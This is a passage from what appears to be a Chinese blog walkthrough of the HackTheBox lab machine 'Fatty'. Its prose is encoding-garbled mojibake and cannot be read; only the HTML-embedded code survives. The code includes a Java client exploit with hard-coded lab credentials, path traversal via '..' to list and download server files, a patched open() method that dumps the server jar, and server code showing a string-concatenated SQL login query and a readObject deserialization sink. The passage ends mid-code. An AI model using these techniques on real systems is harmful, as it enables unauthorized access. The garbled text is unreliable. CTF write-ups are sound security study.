ä¸ªæ“ä½œã€‚å…¶ä¸­configsæ‰§è¡Œçš„ä¼¼ä¹æ˜¯æœåŠ¡ç«¯åˆ—ç›®å½•çš„å·¥ä½œã€‚guiåº•ä¸‹æœ‰ä¸€ä¸ªæŒ‰é’®open,å¯ä»¥è¾“å…¥å¯¹åº”æ–‡ä»¶åè¯»å–æœåŠ¡ç«¯ç›®å½•çš„æ–‡ä»¶ã€‚å°è¯•openåŠŸèƒ½æ—¶fuzzè§¦å‘äº†æŠ¥é”™<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¼¼ä¹<code>..</code>è¿™æ ·çš„æ“ä½œå¯ä»¥è¿›è¡Œä¸€,ä¸¤å±‚è·¯å¾„ç©¿è¶Šã€‚ä½†æ˜¯å¹¶ä¸èƒ½è¾¾æˆä»»æ„åˆ—ç›®å½•ã€‚å› ä¸ºå®ƒè¿‡æ»¤äº†<code>../..</code>ã€‚</p><p>çœ‹äº†ä¸‹æºç ã€‚åˆ—ç›®å½•å¯¹åº”çš„åº”è¯¥æ˜¯è¿™é‡Œ<br>Invokerä¸­çš„showfiles</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">showFiles</span><span class="params">(String folder)</span> <span class="keyword">throws</span> MessageParseException, MessageBuildException, IOException </span>&#123;</span><br><span class="line">    String methodName = (<span class="keyword">new</span> Object() &#123;</span><br><span class="line">    &#125;).getClass().getEnclosingMethod().getName();</span><br><span class="line">    logger.logInfo(<span class="string">"[+] Method '"</span> + methodName + <span class="string">"' was called by user '"</span> + <span class="keyword">this</span>.user.getUsername() + <span class="string">"'."</span>);</span><br><span class="line">    <span class="keyword">if</span> (AccessCheck.checkAccess(methodName, <span class="keyword">this</span>.user)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error: Method '"</span> + methodName + <span class="string">"' is not allowed for this user account"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.action = <span class="keyword">new</span> ActionMessage(<span class="keyword">this</span>.sessionID, <span class="string">"files"</span>);</span><br><span class="line">        <span class="keyword">this</span>.action.addArgument(folder);</span><br><span class="line">        <span class="keyword">this</span>.sendAndRecv();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.response.hasError() ? <span class="string">"Error: Your action caused an error on the application server!"</span> : <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œæˆ‘ä»¬guiä¸­å¯¹åº”configsçš„æ“ä½œæ˜¯</p><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¯è§ã€‚æ­¤å¤„åŸæœ¬è®¾å®šäº†ç›®å½•ä¸ºconfigs.ä½†å€˜è‹¥æˆ‘ä»¬ä¿®æ”¹å…¶ä¸º<code>..</code>æ˜¯å¦å°±èƒ½è·¯å¾„ç©¿è¶Šäº†å‘¢ï¼Ÿä¸å¦¨ä¸€è¯•ã€‚<br>å‚ç…§ippsecè§†é¢‘,è¿™é‡Œæˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿èŠ‚çœæ‰‹åŠ¨æ“ä½œæ—¶é—´,è€Œä¸æ˜¯åå¤ä¿®æ”¹æºç é‡æ–°build jaråŒ…(ç„¶è€Œæ‰“è„¸äº†,åé¢é‡æ–°buildäº†ä¸¤æ¬¡â€¦â€¦)ä¸å¦‚ç›´æ¥å¯¼å…¥jaråŒ…å¹¶ç¼–å†™exp.</p><p>äºæ˜¯è¿™é‡Œæˆ‘å»ä¸‹äº†ä¸€ä¸ªlinux ä¸Šçš„idea.ä¸å¾—ä¸åæ§½é…ç½®ideç¯å¢ƒå±…ç„¶ä¹Ÿå‡ºäº†å°é—®é¢˜ =&gt;  ideaæ— æ³•è‡ªåŠ¨è¯†åˆ«<code>/usr/lib/jvm</code>ä¸­çš„jdk.å¿…é¡»æ‰§è¡Œ<code>sudo apt-get install openjdk-8-jdk</code>åã€‚ideaæ‰èƒ½è‡ªåŠ¨è¯†åˆ«jvmä¸­çš„java8.</p><p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç¯å¢ƒä¸ºjava8çš„å·¥ç¨‹ã€‚å¹¶åœ¨libraryä¸­å¯¼å…¥fatty-client.jarã€‚</p><p>æŒ‰ç…§ippsecçš„æ€è·¯ç®€å•å†™ä¸€ä¸ªåˆ©ç”¨exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> htb.fatty.client.connection.Connection;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.client.methods.Invoker;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.message.MessageBuildException;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.message.MessageParseException;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.resources.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  IOException</span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn = Connection.getConnection();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"[-] connection failed"</span>+e.getMessage());</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[+] Successfully connected"</span>);</span><br><span class="line"></span><br><span class="line">        User user=<span class="keyword">new</span> User(<span class="string">"qtc"</span>,<span class="string">"clarabibi"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn.login(user))&#123;</span><br><span class="line">            System.out.println(<span class="string">"[+] Successfully logged in"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"[-] Login failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String rolename=conn.getRoleName();</span><br><span class="line">        user.setRoleByName(rolename);</span><br><span class="line">        System.out.println(<span class="string">"[+] rolename is: "</span>+rolename);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Invoker invoker =new Invoker(conn,user);</span></span><br><span class="line"><span class="comment">        String response="";</span></span><br><span class="line"><span class="comment">        try &#123;</span></span><br><span class="line"><span class="comment">            response=invoker.showFiles("..");</span></span><br><span class="line"><span class="comment">        &#125; catch (MessageParseException e) &#123;</span></span><br><span class="line"><span class="comment">            e.printStackTrace();</span></span><br><span class="line"><span class="comment">        &#125; catch (MessageBuildException e) &#123;</span></span><br><span class="line"><span class="comment">            e.printStackTrace();</span></span><br><span class="line"><span class="comment">        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">            e.printStackTrace();</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        System.out.println("Server response:\n"+ response);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½é€šè¿‡javaä»£ç æ¥è·ŸæœåŠ¡ç«¯äº¤äº’äº†ã€‚åŒæ—¶æ¯”è¾ƒæ–¹ä¾¿çš„æ˜¯ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¿®æ”¹ä¼ å…¥çš„å€¼æ¥èŠ‚çœæ—¶é—´<br>æ¯”å¦‚ä¸Šé¢ä»£ç æ³¨é‡Šçš„éƒ¨åˆ†å³æ˜¯invokerè°ƒç”¨showFilesæ–¹æ³•å¹¶è·å–å›æ˜¾ã€‚å¹¶ä¸”æˆ‘ä»¬ç›´æ¥å°±å¯ä»¥ä¿®æ”¹ä¼ å…¥çš„å‚æ•°ä¸º<code>..</code>è¿›è¡Œè·¯å¾„ç©¿è¶Š.å¾—åˆ°ä»¥ä¸‹æ–‡ä»¶ã€‚<br>(try catch ç›´æ¥ç”¨ideaå¿«æ·é”®æ·»åŠ å³å¯ã€‚éå¸¸æ–¹ä¾¿)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Server response:</span><br><span class="line">logs</span><br><span class="line">tar</span><br><span class="line">start.sh</span><br><span class="line">fatty-server.jar</span><br><span class="line">files</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨openæ–¹æ³•è¯»æ–‡ä»¶ã€‚æˆ‘ä»¬æŠŠinvokerè°ƒç”¨çš„æ–¹æ³•æ”¹ä¸º<code>open(&quot;..&quot;,&quot;start.sh&quot;)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Unfortunately alpine docker containers seems to have problems with services.</span></span><br><span class="line"><span class="comment"># I tried both, ssh and cron to start via openrc, but non of them worked. Therefore, </span></span><br><span class="line"><span class="comment"># both services are now started as part of the docker startup script.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start cron service</span></span><br><span class="line">crond -b</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start ssh server</span></span><br><span class="line">/usr/sbin/sshd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start Java application server</span></span><br><span class="line">su - qtc /bin/sh -c <span class="string">"java -jar /opt/fatty/fatty-server.jar"</span></span><br></pre></td></tr></table></figure><p>çœ‹æ¥æœåŠ¡ç«¯è¿è¡Œçš„å°±æ˜¯fatty-server.jaräº†.ä¸ºäº†ææ¸…æ¥šæœåŠ¡ç«¯ç©¶ç«Ÿåšäº†ä»€ä¹ˆæ“ä½œã€‚æ¯”å¦‚ä¸ºä»€ä¹ˆæˆ‘ä»¬ç”¨æˆ·ç»„useræƒé™æœ‰äº›æ–¹æ³•è°ƒç”¨ä¸äº†,è¦æ€ä¹ˆå˜ä¸ºadminæƒé™ã€‚æœåŠ¡ç«¯æ˜¯å¦åˆè°ƒç”¨äº†readObjectå‘¢ï¼Ÿè¿™äº›éƒ½éœ€è¦å¯¹serverçš„æºç å®¡è®¡ã€‚</p><p>ç„¶è€Œé—®é¢˜åœ¨äºã€‚æˆ‘ä»¬å¹¶æ²¡æœ‰åŠæ³•åˆ©ç”¨ç°æœ‰çš„æ–¹æ³•è·å–æœåŠ¡jaråŒ…çš„å®Œæ•´æ•°æ®ã€‚å› ä¸ºopenæ–¹æ³•è°ƒç”¨çš„æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    response = <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">    response = <span class="string">"Unable to convert byte[] to String. Did you read in a binary file?"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å³ä½¿ä¸çŸ¥é“æœåŠ¡ç«¯æ˜¯æ€ä¹ˆè¯»æ–‡ä»¶çš„ã€‚ä½†æ˜¯æˆ‘ä»¬çŸ¥é“å›æ˜¾çš„å†…å®¹æ˜¯å¯¹this.respoonseè°ƒç”¨<code>getContentAsString()</code>æ¥å°†å†…å®¹è½¬ä¸ºå­—ç¬¦ä¸²ã€‚é‚£ä¹ˆè¯»å–jaråŒ…è¿™ç§äºŒè¿›åˆ¶æ–‡ä»¶æ—¶å¿…ç„¶ä¼šæœ‰ä¸å¯è§å­—ç¬¦è¢«ç›´æ¥å¿½è§†ã€‚å¯¼è‡´æˆ‘ä»¬è·å–çš„æ–‡ä»¶ä¸å®Œæ•´ã€‚é‚£ä¹ˆå¿…é¡»é‡å†™openæ–¹æ³•ã€‚è®©å®ƒèƒ½ç›´æ¥å°†responseå†…å®¹å†™è¿›æœ¬æœºã€‚</p><p>ç„¶åè¿™é‡Œå°±æ˜¯æ¯”è¾ƒå¤´ç–¼çš„ä¸€å¤„äº†ã€‚æˆ‘çŸ¥é“eclipseå¯ä»¥ç›´æ¥import ç°æœ‰ä¸€ä¸ªjavaæ–‡ä»¶ä½œä¾èµ–ç„¶åé‡å†™è°ƒç”¨(å‰ææ˜¯æ‰§è¡Œäº†å‰é¢çš„unsealè¿‡ç¨‹ã€‚å³åˆ é™¤äº†rsa,sf,ä¿®æ”¹äº†mf)ã€‚ä½†æ˜¯ideaæˆ‘ä¸€ç›´æ²¡æ‰¾åˆ°å¥½çš„è°ƒç”¨æ–¹æ³•ã€‚å¸Œæœ›æœ‰å¤§ä½¬èƒ½æ•™æ•™æˆ‘ideaæ€ä¹ˆå¤„ç†æœ€ä¼˜â€¦..</p><p>æ€»ä¹‹æœ€åã€‚æˆ‘é€‰æ‹©äº†ç›´æ¥é‡å†™ä»£ç å†build jaråŒ…çš„æ–¹æ³•ã€‚è™½ç„¶æœ‰ç‚¹è ¢ä½†æ˜¯è‡³å°‘å¯è¡Œã€‚é¦–å…ˆæˆ‘ä»¬ç›´æ¥è·å–æ–‡ä»¶å†…å®¹å¹¶å†™å…¥ã€‚å› æ­¤åœ¨openæ–¹æ³•ä¸­åŠ å…¥ä»¥ä¸‹ä»£ç ã€‚<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å½“ç„¶ç›´æ¥æ–°åˆ›å»ºä¸€ä¸ªæ–¹æ³•å†™æ–‡ä»¶å¹¶åœ¨expä¸­ä½¿ç”¨invokerè°ƒç”¨ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><p>ç„¶åå°±æ˜¯è¿™æ¬¡å­¦åˆ°çš„å‘½ä»¤è¡Œä¸‹é‡æ–°buildä¸€ä¸ªjaråŒ…çš„å®Œæ•´æµç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javac -cp fatty-client.jar htb/fatty/client/methods/Invoker.java</span><br><span class="line">mkdir raw </span><br><span class="line">cp fatty-client.jar raw/fatty-client.jar </span><br><span class="line"><span class="built_in">cd</span> raw &amp;&amp; unzip fatty-client.jar</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">mv htb/fatty/client/methods/*.class raw/htb/fatty/client/methods/</span><br><span class="line"><span class="built_in">cd</span> raw &amp;&amp; jar -cmf META-INF/MANIFEST.MF fatty.jar .</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒé—¹å¿ƒçš„æ˜¯ã€‚å› ä¸ºä¹‹å‰ç”¨ideaè‡ªåŠ¨åç¼–è¯‘çš„å†…å®¹,å¯¼è‡´æºç çš„javaæ–‡ä»¶æ‰¾ä¸åˆ°ã€‚æˆ‘è¿˜å¾—é‡æ–°åç¼–è¯‘ä¸€ä¸‹jaråŒ…â€¦â€¦ç„¶åä¿®æ”¹Invoker.javaã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">open</span><span class="params">(String foldername, String filename)</span> <span class="keyword">throws</span> MessageParseException, MessageBuildException, IOException </span>&#123;</span><br><span class="line">    String methodName = (<span class="keyword">new</span> Object() &#123;</span><br><span class="line">    &#125;).getClass().getEnclosingMethod().getName();</span><br><span class="line">    logger.logInfo(<span class="string">"[+] Method '"</span> + methodName + <span class="string">"' was called by user '"</span> + <span class="keyword">this</span>.user.getUsername() + <span class="string">"'."</span>);</span><br><span class="line">    <span class="keyword">if</span> (AccessCheck.checkAccess(methodName, <span class="keyword">this</span>.user)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error: Method '"</span> + methodName + <span class="string">"' is not allowed for this user account"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.action = <span class="keyword">new</span> ActionMessage(<span class="keyword">this</span>.sessionID, <span class="string">"open"</span>);</span><br><span class="line">        <span class="keyword">this</span>.action.addArgument(foldername);</span><br><span class="line">        <span class="keyword">this</span>.action.addArgument(filename);</span><br><span class="line">        <span class="keyword">this</span>.sendAndRecv();</span><br><span class="line">        FileOutputStream  fos;</span><br><span class="line">        fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"/tmp/fatty-server.jar"</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.response.hasError()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Error: Your action caused an error on the application server!"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String response = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                response = <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">                response = <span class="string">"Unable to convert byte[] to String. Did you read in a binary file?"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fos.write(<span class="keyword">this</span>.response.getContent()); Â  Â </span><br><span class="line">            fos.close(); </span><br><span class="line">            <span class="keyword">return</span> response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯<code>javac -cp fatty-client.jar htb/fatty/client/methods/Invoker.java</code>.æˆ‘ä»¬ä¼šå‘ç°<code>htb/fatty/client/methods/</code>ä¸‹ç¼–è¯‘å¥½äº†åå‡ ä¸ªclassã€‚æ¥ä¸‹æ¥å°±æ˜¯è§£åŒ…jaråŒ…ã€‚è½¬ç§»classæ–‡ä»¶å¹¶é‡æ–°æ‰“åŒ…jarçš„äº‹æƒ…äº†ã€‚</p><p>ideaä¸­å¯¼å…¥æˆ‘ä»¬é‡æ–°æ”¹å¥½çš„jaråŒ…ã€‚å†æ¬¡æ‰§è¡Œå³å¯å‘ç°èƒ½å¤Ÿæ­£å¸¸ä¸‹è½½äº†ã€‚</p><p>ä¸‹è½½å¥½30åˆ†é’Ÿåæˆ‘ä»¬å¾—åˆ°äº†fatty-server.jarã€‚å†æ¬¡å®¡è®¡serveræºç <br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™ä¸€æ¬¡å¾ˆå¿«å°±èƒ½åœ¨ä¹‹å‰ä¸ç¡®å®šçš„changePWå¤„çœ‹åˆ°<code>readObject()</code>æ–¹æ³•è°ƒç”¨äº†ã€‚ä¹Ÿå°±æ˜¯è¯´è‚¯å®šå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä½†æ˜¯æ³¨æ„ã€‚æŠŠæ•´ä¸ªæºç è¿‡ä¸€éåä¼šå‘ç°changePWæ–¹æ³•å¯¹åº”çš„methodID 7éœ€è¦adminroleæ‰èƒ½æ‰§è¡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Role <span class="title">getAdminRole</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Role(<span class="number">0</span>, <span class="string">"admin"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Role <span class="title">getUserRole</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Role(<span class="number">0</span>, <span class="string">"user"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Role <span class="title">getAnonymous</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Role(<span class="number">0</span>, <span class="string">"anonymous"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¿…é¡»æ‰¾åˆ°ä¸€ä¸ªèƒ½æˆä¸ºadmin roleçš„æ–¹æ³•ã€‚å›åˆ°ç™»å½•é‚£é‡Œçš„æ–¹æ³•å»å®¡è®¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> User <span class="title">checkLogin</span><span class="params">(User user)</span> <span class="keyword">throws</span> FattyDbSession.LoginException </span>&#123;</span><br><span class="line">    Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line">    User newUser = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        stmt = <span class="keyword">this</span>.conn.createStatement();</span><br><span class="line">        rs = stmt.executeQuery(<span class="string">"SELECT id,username,email,password,role FROM users WHERE username='"</span> + user.getUsername() + <span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">3000L</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException var10) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">            <span class="keyword">int</span> id = rs.getInt(<span class="string">"id"</span>);</span><br><span class="line">            String username = rs.getString(<span class="string">"username"</span>);</span><br><span class="line">            String email = rs.getString(<span class="string">"email"</span>);</span><br><span class="line">            String password = rs.getString(<span class="string">"password"</span>);</span><br><span class="line">            String role = rs.getString(<span class="string">"role"</span>);</span><br><span class="line">            newUser = <span class="keyword">new</span> User(id, username, password, email, Role.getRoleByName(role), <span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (newUser.getPassword().equalsIgnoreCase(user.getPassword())) &#123;</span><br><span class="line">                <span 